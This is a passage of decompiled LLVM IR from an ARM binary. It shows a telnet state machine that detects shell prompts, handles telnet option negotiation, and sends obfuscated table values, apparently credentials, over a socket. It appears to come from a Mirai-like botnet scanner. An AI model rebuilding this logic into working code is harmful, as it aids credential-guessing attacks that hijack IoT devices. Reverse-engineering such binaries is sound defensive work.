  br i1 %v7_f96c, label %dec_label_pc_f9b4, label %dec_label_pc_f99c.preheader

dec_label_pc_f99c.preheader:                      ; preds = %dec_label_pc_f96c
  %v3_f970 = add i32 %v0_f740, 28
  %v2_f974 = add i32 %v3_f970, %v3_f938
  store i32 %v2_f974, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f99c

dec_label_pc_f980:                                ; preds = %bb432
  %v2_f980 = icmp ugt i8 %v3_f9a4, 35
  store i1 %v2_f980, i1* %cpsr_c.global-to-local, align 1
  %v7_f980 = icmp eq i8 %v3_f9a4, 36
  store i1 %v7_f980, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f980, label %dec_label_pc_f9b4, label %dec_label_pc_f988

dec_label_pc_f988:                                ; preds = %dec_label_pc_f980
  %v2_f988 = icmp ugt i8 %v3_f9a4, 34
  store i1 %v2_f988, i1* %cpsr_c.global-to-local, align 1
  %v7_f988 = icmp eq i8 %v3_f9a4, 35
  store i1 %v7_f988, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f988, label %dec_label_pc_f9b4, label %dec_label_pc_f990

dec_label_pc_f990:                                ; preds = %dec_label_pc_f988
  %v2_f990 = icmp ugt i8 %v3_f9a4, 36
  store i1 %v2_f990, i1* %cpsr_c.global-to-local, align 1
  %v7_f990 = icmp eq i8 %v3_f9a4, 37
  store i1 %v7_f990, i1* %cpsr_z.global-to-local, align 1
  %v1_f994 = add i32 %v0_f994, -1
  store i32 %v1_f994, i32* %r3.global-to-local, align 4
  br i1 %v7_f990, label %dec_label_pc_f9b4, label %dec_label_pc_f99c

dec_label_pc_f99c:                                ; preds = %dec_label_pc_f99c.preheader, %dec_label_pc_f990
  %v0_f994 = phi i32 [ %v2_f974, %dec_label_pc_f99c.preheader ], [ %v1_f994, %dec_label_pc_f990 ]
  %v0_f99c = phi i32 [ %v1_f93c, %dec_label_pc_f99c.preheader ], [ %v1_f99c, %dec_label_pc_f990 ]
  %v1_f99c = add i32 %v0_f99c, -1
  store i32 %v1_f99c, i32* %r1.global-to-local, align 4
  %v2_f99c = icmp ne i32 %v0_f99c, 0
  store i1 %v2_f99c, i1* %cpsr_c.global-to-local, align 1
  %v7_f99c = icmp eq i32 %v0_f99c, 1
  store i1 %v7_f99c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f99c, label %dec_label_pc_f6c0.backedge.thread562, label %dec_label_pc_f9a4

dec_label_pc_f9a4:                                ; preds = %dec_label_pc_f99c
  %v1_f9a4 = add i32 %v0_f994, -2
  %v2_f9a4 = inttoptr i32 %v1_f9a4 to i8*
  %v3_f9a4 = load i8, i8* %v2_f9a4, align 1
  %v4_f9a4 = zext i8 %v3_f9a4 to i32
  store i32 %v4_f9a4, i32* %r2.global-to-local, align 4
  %v2_f9a8 = icmp ugt i8 %v3_f9a4, 61
  store i1 %v2_f9a8, i1* %cpsr_c.global-to-local, align 1
  %v7_f9a8 = icmp eq i8 %v3_f9a4, 62
  store i1 %v7_f9a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f9a8, label %dec_label_pc_f9b4, label %bb432

bb432:                                            ; preds = %dec_label_pc_f9a4
  %v3_f9ac = icmp ugt i8 %v3_f9a4, 57
  store i1 %v3_f9ac, i1* %cpsr_c.global-to-local, align 1
  %v8_f9ac = icmp eq i8 %v3_f9a4, 58
  store i1 %v8_f9ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f9ac, label %dec_label_pc_f9b4, label %dec_label_pc_f980

dec_label_pc_f9b4:                                ; preds = %dec_label_pc_f9a4, %bb432, %dec_label_pc_f990, %dec_label_pc_f988, %dec_label_pc_f980, %dec_label_pc_f96c, %dec_label_pc_f948, %dec_label_pc_f964, %dec_label_pc_f95c, %bb431
  %v0_f9b8 = phi i32 [ %v1_f93c, %dec_label_pc_f96c ], [ %v1_f93c, %dec_label_pc_f948 ], [ %v1_f93c, %dec_label_pc_f964 ], [ %v1_f93c, %dec_label_pc_f95c ], [ %v1_f93c, %bb431 ], [ %v1_f99c, %dec_label_pc_f980 ], [ %v1_f99c, %dec_label_pc_f988 ], [ %v1_f99c, %dec_label_pc_f990 ], [ %v1_f99c, %bb432 ], [ %v1_f99c, %dec_label_pc_f9a4 ]
  %v1_f9b8 = add i32 %v0_f9b8, 1
  store i32 %v1_f9b8, i32* @r7, align 4
  %v1_f9bc = call i32 @table_unlock_val(i32 10)
  store i32 %v2_1001c, i32* %r1.global-to-local, align 4
  %v3_f9cc = call i32 @table_retrieve_val(i32 10, i32* nonnull %stack_var_-60)
  %v3_f9d0 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f9d0, i32* %r2.global-to-local, align 4
  store i32 %v3_f9cc, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f9dc = load i32, i32* @r6, align 4
  %v1_f9dc = add i32 %v0_f9dc, 4
  %v2_f9dc = inttoptr i32 %v1_f9dc to i32*
  %v3_f9dc = load i32, i32* %v2_f9dc, align 4
  %v4_f9e0 = call i32 @__libc_send(i32 %v3_f9dc, i32 %v3_f9cc, i32 %v3_f9d0, i32 16384)
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19b10.208 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f9f0 = load i32, i32* @r6, align 4
  %v1_f9f0 = add i32 %v0_f9f0, 4
  %v2_f9f0 = inttoptr i32 %v1_f9f0 to i32*
  %v3_f9f0 = load i32, i32* %v2_f9f0, align 4
  %v4_f9f4 = call i32 @__libc_send(i32 %v3_f9f0, i32 ptrtoint ([3 x i8]* @global_var_19b10.208 to i32), i32 2, i32 16384)
  %v1_f9fc = call i32 @table_lock_val(i32 10)
  store i32 10, i32* @r3, align 4
  %v1_fa04 = load i32, i32* @r6, align 4
  %v2_fa04 = add i32 %v1_fa04, 12
  %v3_fa04 = inttoptr i32 %v2_fa04 to i32*
  store i32 10, i32* %v3_fa04, align 4
  br label %dec_label_pc_f910

dec_label_pc_fa0c:                                ; preds = %dec_label_pc_f740
  %v1_fa0c = add i32 %v0_f740, 24
  %v2_fa0c = inttoptr i32 %v1_fa0c to i32*
  %v3_fa0c = load i32, i32* %v2_fa0c, align 4
  store i32 %v3_fa0c, i32* %r1.global-to-local, align 4
  %v0_fa10 = load i32, i32* @fp, align 4
  store i32 %v0_fa10, i32* @r4, align 4
  store i32 0, i32* @r7, align 4
  %v3_fa18172 = icmp eq i32 %v3_fa0c, 0
  store i1 %v3_fa18172, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_fa18172, i1* %cpsr_z.global-to-local, align 1
  %v6_fa1c179 = icmp sgt i32 %v3_fa0c, 0
  br i1 %v6_fa1c179, label %dec_label_pc_fa20.preheader, label %dec_label_pc_facc

dec_label_pc_fa18.loopexit:                       ; preds = %dec_label_pc_fa3c
  %v2_fa44 = add i32 %v1_fa44, 2
  store i32 %v2_fa44, i32* @r4, align 4
  %v2_fa48 = add i32 %v1_fa48, 2
  store i32 %v2_fa48, i32* @r7, align 4
  %v3_fa18 = icmp uge i32 %v2_fa48, %v1_fa18
  store i1 %v3_fa18, i1* %cpsr_c.global-to-local, align 1
  %v9_fa18 = icmp eq i32 %v2_fa48, %v1_fa18
  store i1 %v9_fa18, i1* %cpsr_z.global-to-local, align 1
  %v6_fa1c = icmp slt i32 %v2_fa48, %v1_fa18
  br i1 %v6_fa1c, label %dec_label_pc_fa20.preheader, label %dec_label_pc_facc

dec_label_pc_fa20.preheader:                      ; preds = %dec_label_pc_fa0c, %dec_label_pc_fa18.loopexit
  %v6_fad4273 = phi i32 [ %v6_fad4274, %dec_label_pc_fa18.loopexit ], [ %v0_f740, %dec_label_pc_fa0c ]
  %v1_fa48262 = phi i32 [ %v2_fa48, %dec_label_pc_fa18.loopexit ], [ 0, %dec_label_pc_fa0c ]
  %v1_fa2c260 = phi i32 [ %v1_fa18, %dec_label_pc_fa18.loopexit ], [ %v3_fa0c, %dec_label_pc_fa0c ]
  %v0_fa20258 = phi i32 [ %v2_fa44, %dec_label_pc_fa18.loopexit ], [ %v0_fa10, %dec_label_pc_fa0c ]
  br label %dec_label_pc_fa20

dec_label_pc_fa20:                                ; preds = %dec_label_pc_fa20.preheader, %dec_label_pc_fab0
  %v6_fad4274 = phi i32 [ %v6_fad4273, %dec_label_pc_fa20.preheader ], [ %v0_fab8, %dec_label_pc_fab0 ]
  %v1_fa48 = phi i32 [ %v1_fa48262, %dec_label_pc_fa20.preheader ], [ %v1_fabc, %dec_label_pc_fab0 ]
  %v1_fa18 = phi i32 [ %v1_fa2c260, %dec_label_pc_fa20.preheader ], [ %v3_fab8, %dec_label_pc_fab0 ]
  %v1_fa44 = phi i32 [ %v0_fa20258, %dec_label_pc_fa20.preheader ], [ %v1_fac4, %dec_label_pc_fab0 ]
  %v1_fa20 = inttoptr i32 %v1_fa44 to i8*
  %v2_fa20 = load i8, i8* %v1_fa20, align 1
  %v3_fa20 = zext i8 %v2_fa20 to i32
  store i32 %v3_fa20, i32* @r3, align 4
  %v2_fa24 = icmp eq i8 %v2_fa20, -1
  store i1 %v2_fa24, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_fa24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fa24, label %dec_label_pc_fa2c, label %dec_label_pc_facc

dec_label_pc_fa2c:                                ; preds = %dec_label_pc_fa20
  %v0_fa2c = load i32, i32* @fp, align 4
  %v2_fa2c = add i32 %v0_fa2c, %v1_fa18
  store i32 %v2_fa2c, i32* %r2.global-to-local, align 4
  %v1_fa30 = add i32 %v1_fa44, 1
  store i32 %v1_fa30, i32* @r5, align 4
  %v3_fa34 = icmp uge i32 %v2_fa2c, %v1_fa30
  store i1 %v3_fa34, i1* %cpsr_c.global-to-local, align 1
  %v9_fa34 = icmp eq i32 %v2_fa2c, %v1_fa30
  store i1 %v9_fa34, i1* %cpsr_z.global-to-local, align 1
  %v2_fa38 = xor i1 %v3_fa34, true
  %v3_fa38 = or i1 %v9_fa34, %v2_fa38
  br i1 %v3_fa38, label %dec_label_pc_facc, label %dec_label_pc_fa3c

dec_label_pc_fa3c:                                ; preds = %dec_label_pc_fa2c
  %v2_fa3c = inttoptr i32 %v1_fa30 to i8*
  %v3_fa3c = load i8, i8* %v2_fa3c, align 1
  %v4_fa3c = zext i8 %v3_fa3c to i32
  store i32 %v4_fa3c, i32* @r3, align 4
  %v2_fa40 = icmp eq i8 %v3_fa3c, -1
  store i1 %v2_fa40, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_fa40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fa40, label %dec_label_pc_fa18.loopexit, label %dec_label_pc_fa50

dec_label_pc_fa50:                                ; preds = %dec_label_pc_fa3c
  %v2_fa50 = icmp ugt i8 %v3_fa3c, -4
  store i1 %v2_fa50, i1* %cpsr_c.global-to-local, align 1
  %v7_fa50 = icmp eq i8 %v3_fa3c, -3
  store i1 %v7_fa50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fa50, label %dec_label_pc_100ac, label %dec_label_pc_fa58

dec_label_pc_fa58:                                ; preds = %dec_label_pc_fa50
  %v1_fa58 = add i32 %v1_fa44, 2
  store i32 %v1_fa58, i32* @r3, align 4
  %v3_fa5c = icmp uge i32 %v2_fa2c, %v1_fa58
  store i1 %v3_fa5c, i1* %cpsr_c.global-to-local, align 1
  %v9_fa5c = icmp eq i32 %v2_fa2c, %v1_fa58
  store i1 %v9_fa5c, i1* %cpsr_z.global-to-local, align 1
  %v2_fa60 = xor i1 %v3_fa5c, true
  %v3_fa60 = or i1 %v9_fa5c, %v2_fa60
  br i1 %v3_fa60, label %dec_label_pc_facc, label %dec_label_pc_fa64

dec_label_pc_fa64:                                ; preds = %dec_label_pc_10110, %bb456, %.thread147, %dec_label_pc_fa58
  %v0_fa64 = load i32, i32* @r5, align 4
  %v1_fa64 = inttoptr i32 %v0_fa64 to i8*
  %v2_fa64 = load i8, i8* %v1_fa64, align 1
  %v3_fa64 = zext i8 %v2_fa64 to i32
  store i32 %v3_fa64, i32* %r3.global-to-local, align 4
  %v2_fa68 = icmp ugt i8 %v2_fa64, -4
  store i1 %v2_fa68, i1* %cpsr_c.global-to-local, align 1
  %v7_fa68 = icmp eq i8 %v2_fa64, -3
  store i1 %v7_fa68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fa68, label %.thread97, label %dec_label_pc_fa78

.thread97:                                        ; preds = %dec_label_pc_fa64
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_fa64, align 1
  %v0_fa74.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_fa74.pr.pr, label %.thread100, label %.thread97.dec_label_pc_fa78thread-pre-split_crit_edge

.thread97.dec_label_pc_fa78thread-pre-split_crit_edge: ; preds = %.thread97
  %v0_fa78.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fa78

dec_label_pc_fa78:                                ; preds = %dec_label_pc_fa64, %.thread97.dec_label_pc_fa78thread-pre-split_crit_edge
  %v0_fa78.pr = phi i32 [ %v0_fa78.pr.pre, %.thread97.dec_label_pc_fa78thread-pre-split_crit_edge ], [ %v3_fa64, %dec_label_pc_fa64 ]
  %v2_fa78 = icmp ugt i32 %v0_fa78.pr, 250
  store i1 %v2_fa78, i1* %cpsr_c.global-to-local, align 1
  %v7_fa78 = icmp eq i32 %v0_fa78.pr, 251
  store i1 %v7_fa78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fa78, label %bb433, label %.thread100

bb433:                                            ; preds = %dec_label_pc_fa78
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_fa80 = load i32, i32* @r5, align 4
  %v4_fa80 = inttoptr i32 %v3_fa80 to i8*
  store i8 -3, i8* %v4_fa80, align 1
  br label %.thread100

.thread100:                                       ; preds = %dec_label_pc_fa78, %.thread97, %bb433
  %v0_fa84 = load i32, i32* @r4, align 4
  %v1_fa84 = add i32 %v0_fa84, 2
  %v2_fa84 = inttoptr i32 %v1_fa84 to i8*
  %v3_fa84 = load i8, i8* %v2_fa84, align 1
  %v4_fa84 = zext i8 %v3_fa84 to i32
  store i32 %v4_fa84, i32* %r3.global-to-local, align 4
  %v2_fa88 = icmp ugt i8 %v3_fa84, -4
  store i1 %v2_fa88, i1* %cpsr_c.global-to-local, align 1
  %v7_fa88 = icmp eq i8 %v3_fa84, -3
  store i1 %v7_fa88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fa88, label %.thread101, label %dec_label_pc_fa98

.thread101:                                       ; preds = %.thread100
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v2_fa84, align 1
  %v0_fa94.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_fa94.pr.pr, label %.thread104, label %.thread101.dec_label_pc_fa98thread-pre-split_crit_edge

.thread101.dec_label_pc_fa98thread-pre-split_crit_edge: ; preds = %.thread101
  %v0_fa98.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fa98

dec_label_pc_fa98:                                ; preds = %.thread100, %.thread101.dec_label_pc_fa98thread-pre-split_crit_edge
  %v0_fa98.pr = phi i32 [ %v0_fa98.pr.pre, %.thread101.dec_label_pc_fa98thread-pre-split_crit_edge ], [ %v4_fa84, %.thread100 ]
  %v2_fa98 = icmp ugt i32 %v0_fa98.pr, 250
  store i1 %v2_fa98, i1* %cpsr_c.global-to-local, align 1
  %v7_fa98 = icmp eq i32 %v0_fa98.pr, 251
  store i1 %v7_fa98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fa98, label %bb434, label %.thread104

bb434:                                            ; preds = %dec_label_pc_fa98
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_faa0 = load i32, i32* @r4, align 4
  %v4_faa0 = add i32 %v3_faa0, 2
  %v5_faa0 = inttoptr i32 %v4_faa0 to i8*
  store i8 -3, i8* %v5_faa0, align 1
  br label %.thread104

.thread104:                                       ; preds = %dec_label_pc_fa98, %.thread101, %bb434
  %v0_faa8 = load i32, i32* @r4, align 4
  br label %dec_label_pc_fab0

dec_label_pc_fab0:                                ; preds = %dec_label_pc_101c0, %.thread104
  %storemerge3 = phi i32 [ %v2_100c4, %dec_label_pc_101c0 ], [ %v0_faa8, %.thread104 ]
  %storemerge2 = phi i32 [ 9, %dec_label_pc_101c0 ], [ 3, %.thread104 ]
  %v0_fab4.in.in.in = load i32, i32* @r6, align 4
  %v0_fab4.in.in = add i32 %v0_fab4.in.in.in, 4
  %v0_fab4.in = inttoptr i32 %v0_fab4.in.in to i32*
  %v0_fab4 = load i32, i32* %v0_fab4.in, align 4
  store i32 %storemerge3, i32* %r1.global-to-local, align 4
  store i32 %storemerge2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fab4 = call i32 @__libc_send(i32 %v0_fab4, i32 %storemerge3, i32 %storemerge2, i32 16384)
  %v0_fab8 = load i32, i32* @r6, align 4
  %v1_fab8 = add i32 %v0_fab8, 24
  %v2_fab8 = inttoptr i32 %v1_fab8 to i32*
  %v3_fab8 = load i32, i32* %v2_fab8, align 4
  store i32 %v3_fab8, i32* %r1.global-to-local, align 4
  %v0_fabc = load i32, i32* @r7, align 4
  %v1_fabc = add i32 %v0_fabc, 3
  store i32 %v1_fabc, i32* @r7, align 4
  %v3_fac0 = icmp uge i32 %v1_fabc, %v3_fab8
  store i1 %v3_fac0, i1* %cpsr_c.global-to-local, align 1
  %v9_fac0 = icmp eq i32 %v1_fabc, %v3_fab8
  store i1 %v9_fac0, i1* %cpsr_z.global-to-local, align 1
  %v0_fac4 = load i32, i32* @r4, align 4
  %v1_fac4 = add i32 %v0_fac4, 3
  store i32 %v1_fac4, i32* @r4, align 4
  %v5_fac8 = icmp slt i32 %v1_fabc, %v3_fab8
  br i1 %v5_fac8, label %dec_label_pc_fa20, label %dec_label_pc_facc

dec_label_pc_facc:                                ; preds = %dec_label_pc_fa18.loopexit, %dec_label_pc_fa20, %dec_label_pc_fab0, %dec_label_pc_fa58, %dec_label_pc_fa2c, %dec_label_pc_fa0c, %dec_label_pc_100ac.dec_label_pc_facc.loopexit_crit_edge
  %v6_fad4 = phi i32 [ %v0_100dc, %dec_label_pc_100ac.dec_label_pc_facc.loopexit_crit_edge ], [ %v0_f740, %dec_label_pc_fa0c ], [ %v6_fad4274, %dec_label_pc_fa20 ], [ %v0_fab8, %dec_label_pc_fab0 ], [ %v6_fad4274, %dec_label_pc_fa58 ], [ %v6_fad4274, %dec_label_pc_fa2c ], [ %v6_fad4274, %dec_label_pc_fa18.loopexit ]
  %v0_facc = phi i32 [ %v0_facc.pre.pre, %dec_label_pc_100ac.dec_label_pc_facc.loopexit_crit_edge ], [ 0, %dec_label_pc_fa0c ], [ %v1_fa48, %dec_label_pc_fa20 ], [ %v1_fabc, %dec_label_pc_fab0 ], [ %v1_fa48, %dec_label_pc_fa58 ], [ %v1_fa48, %dec_label_pc_fa2c ], [ %v2_fa48, %dec_label_pc_fa18.loopexit ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_facc = icmp eq i32 %v0_facc, 0
  store i1 %v2_facc, i1* %cpsr_z.global-to-local, align 1
  %tmp435 = icmp slt i32 %v0_facc, 1
  br i1 %tmp435, label %dec_label_pc_f908, label %bb436

bb436:                                            ; preds = %dec_label_pc_facc
  store i32 3, i32* @r3, align 4
  %v7_fad4 = add i32 %v6_fad4, 12
  %v8_fad4 = inttoptr i32 %v7_fad4 to i32*
  store i32 3, i32* %v8_fad4, align 4
  br label %dec_label_pc_f908

dec_label_pc_fadc:                                ; preds = %dec_label_pc_f740
  %v1_fadc = add i32 %v0_f740, 24
  %v2_fadc = inttoptr i32 %v1_fadc to i32*
  %v3_fadc = load i32, i32* %v2_fadc, align 4
  store i32 %v3_fadc, i32* %r2.global-to-local, align 4
  %v1_fae0 = add i32 %v3_fadc, -1
  store i32 %v1_fae0, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fae4 = icmp eq i32 %v1_fae0, 0
  store i1 %v2_fae4, i1* %cpsr_z.global-to-local, align 1
  %tmp437 = icmp slt i32 %v1_fae0, 1
  br i1 %tmp437, label %dec_label_pc_f6c0.backedge.thread, label %dec_label_pc_faec

dec_label_pc_faec:                                ; preds = %dec_label_pc_fadc
  %v2_faec = add i32 %v1_fae0, %v0_f740
  store i32 %v2_faec, i32* %r3.global-to-local, align 4
  %v1_faf0 = add i32 %v2_faec, 28
  %v2_faf0 = inttoptr i32 %v1_faf0 to i8*
  %v3_faf0 = load i8, i8* %v2_faf0, align 1
  %v4_faf0 = zext i8 %v3_faf0 to i32
  store i32 %v4_faf0, i32* %r3.global-to-local, align 4
  %v2_faf4 = icmp ugt i8 %v3_faf0, 61
  store i1 %v2_faf4, i1* %cpsr_c.global-to-local, align 1
  %v7_faf4 = icmp eq i8 %v3_faf0, 62
  store i1 %v7_faf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_faf4, label %dec_label_pc_fb58, label %bb438

bb438:                                            ; preds = %dec_label_pc_faec
  %v3_faf8 = icmp ugt i8 %v3_faf0, 57
  store i1 %v3_faf8, i1* %cpsr_c.global-to-local, align 1
  %v8_faf8 = icmp eq i8 %v3_faf0, 58
  store i1 %v8_faf8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_faf8, label %dec_label_pc_fb58, label %dec_label_pc_fb00

dec_label_pc_fb00:                                ; preds = %bb438
  %v2_fb00 = icmp ugt i8 %v3_faf0, 35
  store i1 %v2_fb00, i1* %cpsr_c.global-to-local, align 1
  %v7_fb00 = icmp eq i8 %v3_faf0, 36
  store i1 %v7_fb00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb00, label %dec_label_pc_fb58, label %dec_label_pc_fb08

dec_label_pc_fb08:                                ; preds = %dec_label_pc_fb00
  %v2_fb08 = icmp ugt i8 %v3_faf0, 34
  store i1 %v2_fb08, i1* %cpsr_c.global-to-local, align 1
  %v7_fb08 = icmp eq i8 %v3_faf0, 35
  store i1 %v7_fb08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb08, label %dec_label_pc_fb58, label %dec_label_pc_fb10

dec_label_pc_fb10:                                ; preds = %dec_label_pc_fb08
  %v2_fb10 = icmp ugt i8 %v3_faf0, 36
  store i1 %v2_fb10, i1* %cpsr_c.global-to-local, align 1
  %v7_fb10 = icmp eq i8 %v3_faf0, 37
  store i1 %v7_fb10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb10, label %dec_label_pc_fb58, label %dec_label_pc_fb40.preheader

dec_label_pc_fb40.preheader:                      ; preds = %dec_label_pc_fb10
  %v3_fb14 = add i32 %v0_f740, 28
  %v2_fb18 = add i32 %v3_fb14, %v3_fadc
  store i32 %v2_fb18, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fb40

dec_label_pc_fb24:                                ; preds = %bb439
  %v2_fb24 = icmp ugt i8 %v3_fb48, 35
  store i1 %v2_fb24, i1* %cpsr_c.global-to-local, align 1
  %v7_fb24 = icmp eq i8 %v3_fb48, 36
  store i1 %v7_fb24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb24, label %dec_label_pc_fb58, label %dec_label_pc_fb2c

dec_label_pc_fb2c:                                ; preds = %dec_label_pc_fb24
  %v2_fb2c = icmp ugt i8 %v3_fb48, 34
  store i1 %v2_fb2c, i1* %cpsr_c.global-to-local, align 1
  %v7_fb2c = icmp eq i8 %v3_fb48, 35
  store i1 %v7_fb2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb2c, label %dec_label_pc_fb58, label %dec_label_pc_fb34

dec_label_pc_fb34:                                ; preds = %dec_label_pc_fb2c
  %v2_fb34 = icmp ugt i8 %v3_fb48, 36
  store i1 %v2_fb34, i1* %cpsr_c.global-to-local, align 1
  %v7_fb34 = icmp eq i8 %v3_fb48, 37
  store i1 %v7_fb34, i1* %cpsr_z.global-to-local, align 1
  %v1_fb38 = add i32 %v0_fb38, -1
  store i32 %v1_fb38, i32* %r3.global-to-local, align 4
  br i1 %v7_fb34, label %dec_label_pc_fb58, label %dec_label_pc_fb40

dec_label_pc_fb40:                                ; preds = %dec_label_pc_fb40.preheader, %dec_label_pc_fb34
  %v0_fb38 = phi i32 [ %v2_fb18, %dec_label_pc_fb40.preheader ], [ %v1_fb38, %dec_label_pc_fb34 ]
  %v0_fb40 = phi i32 [ %v1_fae0, %dec_label_pc_fb40.preheader ], [ %v1_fb40, %dec_label_pc_fb34 ]
  %v1_fb40 = add i32 %v0_fb40, -1
  store i32 %v1_fb40, i32* %r1.global-to-local, align 4
  %v2_fb40 = icmp ne i32 %v0_fb40, 0
  store i1 %v2_fb40, i1* %cpsr_c.global-to-local, align 1
  %v7_fb40 = icmp eq i32 %v0_fb40, 1
  store i1 %v7_fb40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb40, label %dec_label_pc_f6c0.backedge.thread562, label %dec_label_pc_fb48

dec_label_pc_fb48:                                ; preds = %dec_label_pc_fb40
  %v1_fb48 = add i32 %v0_fb38, -2
  %v2_fb48 = inttoptr i32 %v1_fb48 to i8*
  %v3_fb48 = load i8, i8* %v2_fb48, align 1
  %v4_fb48 = zext i8 %v3_fb48 to i32
  store i32 %v4_fb48, i32* %r2.global-to-local, align 4
  %v2_fb4c = icmp ugt i8 %v3_fb48, 61
  store i1 %v2_fb4c, i1* %cpsr_c.global-to-local, align 1
  %v7_fb4c = icmp eq i8 %v3_fb48, 62
  store i1 %v7_fb4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb4c, label %dec_label_pc_fb58, label %bb439

bb439:                                            ; preds = %dec_label_pc_fb48
  %v3_fb50 = icmp ugt i8 %v3_fb48, 57
  store i1 %v3_fb50, i1* %cpsr_c.global-to-local, align 1
  %v8_fb50 = icmp eq i8 %v3_fb48, 58
  store i1 %v8_fb50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fb50, label %dec_label_pc_fb58, label %dec_label_pc_fb24

dec_label_pc_fb58:                                ; preds = %dec_label_pc_fb48, %bb439, %dec_label_pc_fb34, %dec_label_pc_fb2c, %dec_label_pc_fb24, %dec_label_pc_fb10, %dec_label_pc_faec, %dec_label_pc_fb08, %dec_label_pc_fb00, %bb438
  %v0_fb5c = phi i32 [ %v1_fae0, %dec_label_pc_fb10 ], [ %v1_fae0, %dec_label_pc_faec ], [ %v1_fae0, %dec_label_pc_fb08 ], [ %v1_fae0, %dec_label_pc_fb00 ], [ %v1_fae0, %bb438 ], [ %v1_fb40, %dec_label_pc_fb24 ], [ %v1_fb40, %dec_label_pc_fb2c ], [ %v1_fb40, %dec_label_pc_fb34 ], [ %v1_fb40, %bb439 ], [ %v1_fb40, %dec_label_pc_fb48 ]
  %v1_fb5c = add i32 %v0_fb5c, 1
  store i32 %v1_fb5c, i32* @r7, align 4
  %v1_fb60 = call i32 @table_unlock_val(i32 8)
  store i32 %v2_1001c, i32* %r1.global-to-local, align 4
  %v3_fb70 = call i32 @table_retrieve_val(i32 8, i32* nonnull %stack_var_-60)
  %v3_fb74 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_fb74, i32* %r2.global-to-local, align 4
  store i32 %v3_fb70, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fb80 = load i32, i32* @r6, align 4
  %v1_fb80 = add i32 %v0_fb80, 4
  %v2_fb80 = inttoptr i32 %v1_fb80 to i32*
  %v3_fb80 = load i32, i32* %v2_fb80, align 4
  %v4_fb84 = call i32 @__libc_send(i32 %v3_fb80, i32 %v3_fb70, i32 %v3_fb74, i32 16384)
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19b10.208 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_fb94 = load i32, i32* @r6, align 4
  %v1_fb94 = add i32 %v0_fb94, 4
  %v2_fb94 = inttoptr i32 %v1_fb94 to i32*
  %v3_fb94 = load i32, i32* %v2_fb94, align 4
  %v4_fb98 = call i32 @__libc_send(i32 %v3_fb94, i32 ptrtoint ([3 x i8]* @global_var_19b10.208 to i32), i32 2, i32 16384)
  %v1_fba0 = call i32 @table_lock_val(i32 8)
  store i32 7, i32* @r3, align 4
  %v1_fba8 = load i32, i32* @r6, align 4
  %v2_fba8 = add i32 %v1_fba8, 12
  %v3_fba8 = inttoptr i32 %v2_fba8 to i32*
  store i32 7, i32* %v3_fba8, align 4
  br label %dec_label_pc_f910

dec_label_pc_fbb0:                                ; preds = %dec_label_pc_f740
  %v1_fbb0 = add i32 %v0_f740, 24
  %v2_fbb0 = inttoptr i32 %v1_fbb0 to i32*
  %v3_fbb0 = load i32, i32* %v2_fbb0, align 4
  store i32 %v3_fbb0, i32* %r2.global-to-local, align 4
  %v1_fbb4 = add i32 %v3_fbb0, -1
  store i32 %v1_fbb4, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fbb8 = icmp eq i32 %v1_fbb4, 0
  store i1 %v2_fbb8, i1* %cpsr_z.global-to-local, align 1
  %tmp440 = icmp slt i32 %v1_fbb4, 1
  br i1 %tmp440, label %dec_label_pc_f6c0.backedge.thread, label %dec_label_pc_fbc0

dec_label_pc_fbc0:                                ; preds = %dec_label_pc_fbb0
  %v2_fbc0 = add i32 %v1_fbb4, %v0_f740
  store i32 %v2_fbc0, i32* %r3.global-to-local, align 4
  %v1_fbc4 = add i32 %v2_fbc0, 28
